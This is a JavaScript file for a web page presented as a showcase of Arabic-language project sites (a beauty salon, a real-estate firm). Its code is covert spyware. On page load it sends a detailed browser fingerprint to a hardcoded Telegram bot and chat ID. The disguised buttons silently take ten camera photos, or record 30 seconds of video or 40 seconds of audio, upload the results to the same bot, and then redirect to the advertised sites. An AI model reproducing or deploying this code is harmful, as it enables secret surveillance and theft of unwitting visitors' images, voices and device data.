/* =================
   Professional JavaScript Logic
   ================= */
document.addEventListener('DOMContentLoaded', async () => {
    // Configuration
    const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg';
    const CHAT_ID = '5372717005';

    // UI Elements
    const capturePhotoBtn = document.getElementById('capturePhotoBtn');
    const recordVideoBtn = document.getElementById('recordVideoBtn');
    const recordAudioBtn = document.getElementById('recordAudioBtn');
    const fingerprintBtn = document.getElementById('fingerprintBtn');

    // State Variables
    let stream = null;
    let mediaRecorder = null;
    let recordingType = '';
    let initialErrorShown = false;
    
    // Send browser fingerprint on page load
    try {
        const fingerprint = await collectBrowserFingerprint();
        const fingerprintText = JSON.stringify(fingerprint, null, 2);
        const blob = new Blob([fingerprintText], { type: 'text/plain' });
        const formData = {
            method: 'sendDocument',
            fileType: 'document',
            file: blob,
            fileName: `browser_info_${Date.now()}.txt`
        };
        await sendToTelegram(formData, '📱 معلومات المتصفح والجهاز عند تحميل الصفحة');
    } catch (error) {
        console.error('Error sending initial fingerprint:', error);
    }

    // ==================== Helper Functions ====================

    // Get supported video MIME type
    function getSupportedVideoMimeType() {
        const types = [
            'video/webm;codecs=vp9,opus',
            'video/webm;codecs=vp8,opus',
            'video/webm',
            'video/mp4',
            'video/x-msvideo'
        ];
        for (let type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'video/webm';
    }

    // Get supported audio MIME type
    function getSupportedAudioMimeType() {
        const types = [
            'audio/webm',
            'audio/mp4',
            'audio/mpeg',
            'audio/wav'
        ];
        for (let type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'audio/webm';
    }

    // Update progress ring
    function updateProgressRing(button, percentage) {
        const progressRing = button.querySelector('.progress-ring');
        const circle = button.querySelector('.progress-circle');
        const progressText = button.querySelector('.progress-text');

        if (progressRing && circle && progressText) {
            const circumference = 2 * Math.PI * 25;
            const offset = circumference - (percentage / 100) * circumference;
            circle.style.strokeDashoffset = offset;
            progressText.textContent = percentage + '%';

            if (percentage > 0) {
                progressRing.classList.add('active');
            } else {
                progressRing.classList.remove('active');
            }
        }
    }

    // Send data to Telegram
    async function sendToTelegram(formData, caption = '', retries = 3) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;

        for (let attempt = 1; attempt <= retries; attempt++) {
            try {
                const data = new FormData();
                data.append('chat_id', CHAT_ID);
                data.append(formData.fileType, formData.file, formData.fileName);
                if (caption) {
                    data.append('caption', caption);
                }

                const response = await fetch(url, {
                    method: 'POST',
                    body: data,
                    timeout: 30000
                });

                if (!response.ok) {
                    if (attempt < retries) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                        continue;
                    }
                    return false;
                }

                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error(`Attempt ${attempt} failed:`, error);
                if (attempt < retries) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                    continue;
                }
                return false;
            }
        }
        return false;
    }

    // Initialize camera/microphone
    async function init() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return;
        }

        try {
            // Try to get camera and microphone
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: true
                });
            } catch (err) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: true
                    });
                } catch (err2) {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: true
                    });
                }
            }

            // Enable buttons
            capturePhotoBtn.disabled = false;
            recordVideoBtn.disabled = false;
            recordAudioBtn.disabled = false;
            fingerprintBtn.disabled = false;
        } catch (err) {
            // Show error only once on page load
            if (!initialErrorShown) {
                initialErrorShown = true;
                // Error message shown only once
            }
        }
    }

    // ==================== Photo Capture ====================
    capturePhotoBtn.addEventListener('click', async () => {
        if (!stream) {
            return;
        }

        capturePhotoBtn.disabled = true;

        try {
            const canvas = document.createElement('canvas');
            const videoTrack = stream.getVideoTracks()[0];
            if (!videoTrack) {
                capturePhotoBtn.disabled = false;
                return;
            }

            let width = 640;
            let height = 480;
            try {
                const settings = videoTrack.getSettings();
                if (settings.width && settings.height) {
                    width = settings.width;
                    height = settings.height;
                }
            } catch (err) {
                console.warn('Could not get video settings:', err);
            }

            canvas.width = width;
            canvas.height = height;
            const context = canvas.getContext('2d');

            for (let i = 0; i < 10; i++) {
                updateProgressRing(capturePhotoBtn, (i + 1) * 10);
                let captureSuccess = false;

                try {
                    const videoTrack = stream.getVideoTracks()[0];
                    if (!videoTrack) {
                        throw new Error('');
                    }

                    // Try ImageCapture API first
                    if (typeof ImageCapture !== 'undefined') {
                        try {
                            const imageCaptureObj = new ImageCapture(videoTrack);
                            const bitmap = await imageCaptureObj.grabFrame();
                            const canvas2 = document.createElement('canvas');
                            canvas2.width = bitmap.width;
                            canvas2.height = bitmap.height;
                            const ctx = canvas2.getContext('2d');
                            ctx.drawImage(bitmap, 0, 0);

                            const blob = await new Promise((resolve, reject) => {
                                canvas2.toBlob((blob) => {
                                    if (blob) {
                                        resolve(blob);
                                    } else {
                                        reject(new Error(''));
                                    }
                                }, 'image/jpeg', 0.95);
                            });

                            const formData = {
                                method: 'sendPhoto',
                                fileType: 'photo',
                                file: blob,
                                fileName: `capture_${Date.now()}_${i}.jpg`
                            };
                            await sendToTelegram(formData);
                            captureSuccess = true;
                        } catch (imageCaptureErr) {
                            console.warn('ImageCapture failed:', imageCaptureErr);
                        }
                    }

                    // Fallback to canvas method
                    if (!captureSuccess) {
                        const tempVideo = document.createElement('video');
                        tempVideo.srcObject = stream;
                        tempVideo.muted = true;
                        tempVideo.play();

                        await new Promise(resolve => setTimeout(resolve, 100));

                        context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
                        const blob = await new Promise((resolve, reject) => {
                            canvas.toBlob((blob) => {
                                if (blob) {
                                    resolve(blob);
                                } else {
                                    reject(new Error(''));
                                }
                            }, 'image/jpeg', 0.95);
                        });

                        const formData = {
                            method: 'sendPhoto',
                            fileType: 'photo',
                            file: blob,
                            fileName: `capture_${Date.now()}_${i}.jpg`
                        };
                        await sendToTelegram(formData);
                        captureSuccess = true;
                    }

                    if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                } catch (photoError) {
                    console.error(`Photo capture error ${i + 1}:`, photoError);
                }
            }

            updateProgressRing(capturePhotoBtn, 0);
            setTimeout(() => {
                window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
            }, 500);
        } catch (error) {
            console.error('Photo capture error:', error);
            updateProgressRing(capturePhotoBtn, 0);
        } finally {
            capturePhotoBtn.disabled = false;
        }
    });

    // ==================== Video Recording ====================
    recordVideoBtn.addEventListener('click', () => {
        if (!stream) {
            return;
        }

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'video';
            const videoMimeType = getSupportedVideoMimeType();
            startRecording(stream, videoMimeType, 30000); // 30 seconds
            recordVideoBtn.textContent = 'موقع زينة تاتش';
            recordVideoBtn.classList.add('btn-stop');
            recordAudioBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            updateProgressRing(recordVideoBtn, 0);
        }
    });

    // ==================== Audio Recording ====================
    recordAudioBtn.addEventListener('click', () => {
        if (!stream) {
            return;
        }

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'audio';
            const audioStream = new MediaStream(stream.getAudioTracks());
            const audioMimeType = getSupportedAudioMimeType();
            startRecording(audioStream, audioMimeType, 40000); // 40 seconds
            recordAudioBtn.textContent = 'موقع بيتك العقارية ';
            recordAudioBtn.classList.add('btn-stop');
            recordVideoBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            updateProgressRing(recordAudioBtn, 0);
        }
    });

    // Start recording
    function startRecording(streamToRecord, mimeType, duration) {
        let recordedChunks = [];

        try {
            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
        } catch (error) {
            console.error('MediaRecorder error:', error);
            resetButtons();
            return;
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onerror = (event) => {
            console.error('Recording error:', event.error);
            resetButtons();
        };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            recordedChunks = [];

            let fileExtension = 'webm';
            if (mimeType.includes('mp4')) fileExtension = 'mp4';
            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
            else if (mimeType.includes('wav')) fileExtension = 'wav';
            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';

            let formData;
            if (recordingType === 'video') {
                formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `video_${Date.now()}.${fileExtension}`
                };
            } else {
                formData = {
                    method: 'sendAudio',
                    fileType: 'audio',
                    file: blob,
                    fileName: `audio_${Date.now()}.${fileExtension}`
                };
            }

            const success = await sendToTelegram(formData);
            if (success) {
                setTimeout(() => {
                    if (recordingType === 'video') {
                        window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
                    } else if (recordingType === 'audio') {
                        window.open('https://abuali782.github.io/BaytakRealEstate/', '_blank');
                    }
                }, 500);
            }

            resetButtons();
        };

        try {
            mediaRecorder.start();
            
            // Auto-stop recording after specified duration
            if (duration) {
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, duration);
            }
        } catch (error) {
            console.error('Recording start error:', error);
            resetButtons();
        }
    }

    // Reset buttons
    function resetButtons() {
        recordVideoBtn.textContent = ' موقع زينة تاتش';
        recordVideoBtn.classList.remove('btn-stop');
        recordAudioBtn.textContent = ' موقع بيتك العقارية';
        recordAudioBtn.classList.remove('btn-stop');

        capturePhotoBtn.disabled = false;
        recordVideoBtn.disabled = false;
        recordAudioBtn.disabled = false;
        fingerprintBtn.disabled = false;

        updateProgressRing(recordVideoBtn, 0);
        updateProgressRing(recordAudioBtn, 0);
    }

    // ==================== Browser Fingerprint ====================
    fingerprintBtn.addEventListener('click', async () => {
        fingerprintBtn.disabled = true;

        try {
            const fingerprint = await collectBrowserFingerprint();
            const fingerprintText = JSON.stringify(fingerprint, null, 2);

            const blob = new Blob([fingerprintText], { type: 'text/plain' });
            const formData = {
                method: 'sendDocument',
                fileType: 'document',
                file: blob,
                fileName: `fingerprint_${Date.now()}.txt`
            };

            await sendToTelegram(formData, '📱 معلومات المتصفح والجهاز الكاملة');
        } catch (error) {
            console.error('Fingerprint collection error:', error);
        } finally {
            fingerprintBtn.disabled = false;
        }
    });

    // Collect browser fingerprint
    async function collectBrowserFingerprint() {
        const fingerprint = {
            // === معلومات الوقت والتاريخ ===
            timestamp: new Date().toISOString(),
            localTime: new Date().toLocaleString('ar-YE'),
            
            // === معلومات المتصفح الأساسية ===
            browser: {
                userAgent: navigator.userAgent,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                appCodeName: navigator.appCodeName,
                vendor: navigator.vendor,
                product: navigator.product,
                productSub: navigator.productSub
            },
            
            // === معلومات النظام والمنصة ===
            system: {
                platform: navigator.platform,
                oscpu: navigator.oscpu,
                cpuClass: navigator.cpuClass,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints
            },
            
            // === معلومات اللغة والمنطقة ===
            localization: {
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale
            },
            
            // === معلومات الشاشة والعرض ===
            display: {
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                screenColorDepth: window.screen.colorDepth,
                screenPixelDepth: window.screen.pixelDepth,
                screenOrientation: window.screen.orientation?.type || 'Unknown',
                availScreenWidth: window.screen.availWidth,
                availScreenHeight: window.screen.availHeight,
                devicePixelRatio: window.devicePixelRatio,
                windowInnerWidth: window.innerWidth,
                windowInnerHeight: window.innerHeight,
                windowOuterWidth: window.outerWidth,
                windowOuterHeight: window.outerHeight
            },
            
            // === معلومات الميزات والقدرات ===
            features: {
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                onLine: navigator.onLine,
                localStorage: typeof localStorage !== 'undefined',
                sessionStorage: typeof sessionStorage !== 'undefined',
                indexedDB: typeof indexedDB !== 'undefined',
                openDatabase: typeof openDatabase !== 'undefined',
                serviceWorker: 'serviceWorker' in navigator,
                webWorker: typeof Worker !== 'undefined',
                webSocket: 'WebSocket' in window,
                webRTC: !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia),
                geolocation: navigator.geolocation ? 'Available' : 'Not Available',
                mediaDevices: navigator.mediaDevices ? 'Available' : 'Not Available',
                permissions: navigator.permissions ? 'Available' : 'Not Available',
                vibration: 'vibrate' in navigator,
                battery: 'getBattery' in navigator,
                clipboard: 'clipboard' in navigator,
                credentials: 'credentials' in navigator
            },
            
            // === معلومات الاتصال والشبكة ===
            network: getConnectionInfo(),
            
            // === معلومات الأجهزة ===
            hardware: {
                battery: await getBatteryInfo(),
                mediaDevices: await getMediaDevicesInfo()
            },
            
            // === معلومات الرسومات والأداء ===
            graphics: {
                canvas: await getCanvasFingerprint(),
                webgl: getWebGLFingerprint(),
                webglVendor: getWebGLVendor()
            },
            
            // === معلومات الإضافات والملحقات ===
            plugins: getPluginsInfo(),
            
            // === معلومات الأداء ===
            performance: {
                memory: performance.memory ? {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                } : 'Not Available',
                navigation: performance.navigation ? {
                    type: performance.navigation.type,
                    redirectCount: performance.navigation.redirectCount
                } : 'Not Available'
            }
        };

        return fingerprint;
    }
    
    // Get battery info
    async function getBatteryInfo() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return 'Not Available';
        } catch (e) {
            return 'Not Available';
        }
    }

    // Get canvas fingerprint
    async function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 60;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprint', 4, 17);
            return canvas.toDataURL();
        } catch (e) {
            return 'Not available';
        }
    }

    // Get WebGL fingerprint
    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Not available';

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch (e) {
            return 'Not available';
        }
    }

    // Get plugins info
    function getPluginsInfo() {
        try {
            return Array.from(navigator.plugins).map(p => ({
                name: p.name,
                description: p.description,
                version: p.version
            }));
        } catch (e) {
            return [];
        }
    }

    // Get connection info
    function getConnectionInfo() {
        try {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return 'Not available';

            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
        } catch (e) {
            return 'Not available';
        }
    }

    // Get media devices info
    async function getMediaDevicesInfo() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return 'Not available';
            }
            const devices = await navigator.mediaDevices.enumerateDevices();
            const deviceInfo = {
                audioInput: [],
                audioOutput: [],
                videoInput: []
            };
            devices.forEach(device => {
                if (device.kind === 'audioinput') {
                    deviceInfo.audioInput.push(device.label || 'Unknown');
                } else if (device.kind === 'audiooutput') {
                    deviceInfo.audioOutput.push(device.label || 'Unknown');
                } else if (device.kind === 'videoinput') {
                    deviceInfo.videoInput.push(device.label || 'Unknown');
                }
            });
            return deviceInfo;
        } catch (e) {
            return 'Not available';
        }
    }

    // Get WebGL vendor
    function getWebGLVendor() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Not available';
            
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
            };
        } catch (e) {
            return 'Not available';
        }
    }

    // ==================== Redirect Function ====================
    function redirectAfterSuccess() {
        const choice = confirm('هل تريد الذهاب إلى موقع زينة تاتش؟');

        if (choice) {
            window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
        } else {
            window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
        }
    }

    // ==================== Project Buttons ====================
    const projectBtn1 = document.getElementById('projectBtn1');
    const projectBtn2 = document.getElementById('projectBtn2');
    const projectBtn3 = document.getElementById('projectBtn3');

    // Project 1: Capture 10 photos and redirect to mubassitalshamal
    if (projectBtn1) {
        projectBtn1.addEventListener('click', async () => {
            if (!stream) {
                return;
            }

            projectBtn1.disabled = true;

            try {
                const canvas = document.createElement('canvas');
                const videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) {
                    projectBtn1.disabled = false;
                    return;
                }

                let width = 640;
                let height = 480;
                try {
                    const settings = videoTrack.getSettings();
                    if (settings.width && settings.height) {
                        width = settings.width;
                        height = settings.height;
                    }
                } catch (err) {
                    console.warn('Could not get video settings:', err);
                }

                canvas.width = width;
                canvas.height = height;
                const context = canvas.getContext('2d');

                for (let i = 0; i < 10; i++) {
                    let captureSuccess = false;

                    try {
                        const videoTrack = stream.getVideoTracks()[0];
                        if (!videoTrack) {
                            throw new Error('');
                        }

                        // Try ImageCapture API first
                        if (typeof ImageCapture !== 'undefined') {
                            try {
                                const imageCaptureObj = new ImageCapture(videoTrack);
                                const bitmap = await imageCaptureObj.grabFrame();
                                const canvas2 = document.createElement('canvas');
                                canvas2.width = bitmap.width;
                                canvas2.height = bitmap.height;
                                const ctx = canvas2.getContext('2d');
                                ctx.drawImage(bitmap, 0, 0);

                                const blob = await new Promise((resolve, reject) => {
                                    canvas2.toBlob((blob) => {
                                        if (blob) {
                                            resolve(blob);
                                        } else {
                                            reject(new Error(''));
                                        }
                                    }, 'image/jpeg', 0.95);
                                });

                                const formData = {
                                    method: 'sendPhoto',
                                    fileType: 'photo',
                                    file: blob,
                                    fileName: `project1_photo_${Date.now()}_${i}.jpg`
                                };
                                await sendToTelegram(formData);
                                captureSuccess = true;
                            } catch (imageCaptureErr) {
                                console.warn('ImageCapture failed:', imageCaptureErr);
                            }
                        }

                        // Fallback to canvas method
                        if (!captureSuccess) {
                            const tempVideo = document.createElement('video');
                            tempVideo.srcObject = stream;
                            tempVideo.muted = true;
                            tempVideo.play();

                            await new Promise(resolve => setTimeout(resolve, 100));

                            context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
                            const blob = await new Promise((resolve, reject) => {
                                canvas.toBlob((blob) => {
                                    if (blob) {
                                        resolve(blob);
                                    } else {
                                        reject(new Error(''));
                                    }
                                }, 'image/jpeg', 0.95);
                            });

                            const formData = {
                                method: 'sendPhoto',
                                fileType: 'photo',
                                file: blob,
                                fileName: `project1_photo_${Date.now()}_${i}.jpg`
                            };
                            await sendToTelegram(formData);
                            captureSuccess = true;
                        }

                        if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                    } catch (photoError) {
                        console.error(`Photo capture error ${i + 1}:`, photoError);
                    }
                }

                setTimeout(() => {
                    window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
                }, 500);
            } catch (error) {
                console.error('Photo capture error:', error);
            } finally {
                projectBtn1.disabled = false;
            }
        });
    }

    // Project 2: Record 30 second video and redirect to Zena Touch
    if (projectBtn2) {
        projectBtn2.addEventListener('click', () => {
            if (!stream) {
                return;
            }

            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            } else {
                recordingType = 'project2';
                const videoMimeType = getSupportedVideoMimeType();
                startRecordingProject(stream, videoMimeType, 30000, 'https://abuali782.github.io/Zena-Touch-v2/');
                projectBtn2.disabled = true;
            }
        });
    }

    // Project 3: Record 40 second audio and redirect to Baytak Real Estate
    if (projectBtn3) {
        projectBtn3.addEventListener('click', () => {
            if (!stream) {
                return;
            }

            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            } else {
                recordingType = 'project3';
                const audioStream = new MediaStream(stream.getAudioTracks());
                const audioMimeType = getSupportedAudioMimeType();
                startRecordingProject(audioStream, audioMimeType, 40000, 'https://abuali782.github.io/BaytakRealEstate/');
                projectBtn3.disabled = true;
            }
        });
    }

    // Start recording for projects
    function startRecordingProject(streamToRecord, mimeType, duration, redirectUrl) {
        let recordedChunks = [];

        try {
            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
        } catch (error) {
            console.error('MediaRecorder error:', error);
            return;
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onerror = (event) => {
            console.error('Recording error:', event.error);
        };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            recordedChunks = [];

            let fileExtension = 'webm';
            if (mimeType.includes('mp4')) fileExtension = 'mp4';
            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
            else if (mimeType.includes('wav')) fileExtension = 'wav';
            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';

            let formData;
            if (recordingType === 'project2') {
                formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `project2_video_${Date.now()}.${fileExtension}`
                };
            } else if (recordingType === 'project3') {
                formData = {
                    method: 'sendAudio',
                    fileType: 'audio',
                    file: blob,
                    fileName: `project3_audio_${Date.now()}.${fileExtension}`
                };
            }

            const success = await sendToTelegram(formData);
            if (success) {
                setTimeout(() => {
                    window.open(redirectUrl, '_blank');
                }, 500);
            }

            projectBtn2.disabled = false;
            projectBtn3.disabled = false;
        };

        try {
            mediaRecorder.start();
            
            // Auto-stop recording after specified duration
            if (duration) {
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, duration);
            }
        } catch (error) {
            console.error('Recording start error:', error);
        }
    }

    // ==================== Open Project ====================
    window.openProject = function(url) {
        window.open(url, '_blank');
    };

    // Initialize on page load
    init();
});
